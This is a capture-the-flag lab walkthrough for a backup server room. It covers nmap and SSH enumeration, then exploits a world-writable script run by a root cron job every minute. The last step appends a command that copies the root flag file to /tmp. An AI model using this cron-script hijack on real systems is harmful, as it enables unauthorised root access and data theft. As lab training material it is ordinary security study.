
- Room Information
	- A backup server hums quietly, running its automated maintenance tasks on schedule. But are those scheduled tasks really secure? SSH in, enumerate the system like a real pentester, and discover how a simple misconfiguration can lead to complete system compromise. Time is ticking, the cron job runs every minute!
	

- 1) Nmap Enumeration
	- NMAP -sV (TARGET IP)
		- Results
			- PORT   STATE SERVICE VERSION
				- 22/tcp open  ssh     OpenSSH 10.2 (protocol 2.0)
				- 80/tcp open  http    nginx
- 2) Website Browse
	- ![[Pasted image 20260602095922.png]]
- 3) SSH Enumeration
	- Readme.txt
		- You have been granted access to assess this backup server. The server runs an automated backup management system. Your objectives: 
			- Identify any sensitive information exposure
			- Find privilege escalation vulnerabilities
		- Known services:
			- Web interface on port 80
			- SSH on port 22
			- Backup manager installed in /opt/
- 4) User Flag
	- Browse to /opt/ folder as mentioned above
		- Located file while browsing scripts folder
	
- 5) Next Steps
	- Check Cron Jobs
		- To do this run 'cat crontab' from /etc folder
	- Found cron job with full permissions granted
		* * * * * root /bin/sh /opt/backup-manager/scripts/system_check.sh >> /var/log/maintenance/system_check.log 2>&1
		
	- Permissions check using `ls -l /opt/backup-manager/scripts/system_check.sh`
		- -rwxrwxrwx /opt/backup-manager/scripts/system_check.sh - Full Permissions
- 6) Contents of script

``` Results
#!/bin/sh
# System Health Check Script
# Runs periodically to monitor system status

echo "[$(date)] Starting system check..."
df -h > /tmp/disk_status.txt 2>/dev/null
echo "[$(date)] Disk check complete."
echo "[$(date)] System check finished."
ip-10-0-10-176:/etc$
```

- 7) Contents of disk_status.txt - Not sure if this is needed
``` Results
Filesystem                Size      Used Available Use% Mounted on
overlay                  20.5G      2.6G     16.8G  13% /
tmpfs                    64.0M         0     64.0M   0% /dev
shm                     920.1M         0    920.1M   0% /dev/shm
tmpfs                   920.1M         0    920.1M   0% /sys/fs/cgroup
/dev/nvme1n1             20.5G      2.6G     16.8G  13% /etc/hosts
/dev/nvme1n1             20.5G      2.6G     16.8G  13% /etc/resolv.conf
/dev/nvme1n1             20.5G      2.6G     16.8G  13% /etc/hostname
tmpfs                   920.1M         0    920.1M   0% /proc/acpi
tmpfs                    64.0M         0     64.0M   0% /proc/kcore
tmpfs                    64.0M         0     64.0M   0% /proc/keys
tmpfs                    64.0M         0     64.0M   0% /proc/latency_stats
tmpfs                    64.0M         0     64.0M   0% /proc/timer_list
tmpfs                   920.1M         0    920.1M   0% /sys/firmware
tmpfs                   920.1M         0    920.1M   0% /proc/scsi
```

- 8) Modify cron job script
	- `echo "cp /root/flag-root.txt /tmp/flag.txt && chmod 644 /tmp/flag.txt" >> /opt/backup-manager/scripts/system_check.sh`
		- `cp /root/flag-root.txt` - what file to copy
		- `/tmp/flag.txt` - where to copy file to
		- `chmod 644 /tmp/flag.txt` - sets file permissions to make it readable
		- `>> /opt/backup-manager/scripts/system_check.sh` - what script is being appended 